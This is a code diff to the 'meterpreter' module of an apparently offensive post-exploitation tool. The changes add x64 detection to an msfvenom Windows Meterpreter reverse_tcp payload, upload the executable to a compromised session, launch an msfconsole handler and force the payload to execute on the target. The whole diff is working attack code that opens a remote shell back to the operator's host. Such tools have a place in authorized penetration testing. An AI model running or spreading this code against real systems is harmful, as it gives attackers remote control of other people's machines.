@@ -4836,21 +4836,28 @@ class meterpreter(Module):
 			payload_path = f"/dev/shm/{rand(10)}.exe"
 			host = session._host
 			port = 5555
-			payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
+			arch = ''
+			if session.arch == "x64-based_PC":
+				arch = 'x64/'
+			payload_creation_cmd = f"msfvenom -p windows/{arch}meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
+			logger.info("Creating payload...")
+			print(payload_creation_cmd)
 			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
 
 			if result.returncode == 0:
 				logger.info("Payload created!")
 				uploaded_path = session.upload(payload_path)
+				os.remove(payload_path)
 				if uploaded_path:
 					meterpreter_handler_cmd = (
 						'msfconsole -x "use exploit/multi/handler; '
-						'set payload windows/meterpreter/reverse_tcp; '
+						f'set payload windows/{arch}meterpreter/reverse_tcp; '
 						f'set LHOST {host}; set LPORT {port}; run"'
 					)
 					Open(meterpreter_handler_cmd, terminal=True)
+					logger.info("Starting handler...")
 					print(meterpreter_handler_cmd)
-					session.exec(uploaded_path[0])
+					session.exec(uploaded_path[0], force_cmd=True)
 			else:
 				logger.error(f"Cannot create meterpreter payload: {result.stderr}")
 
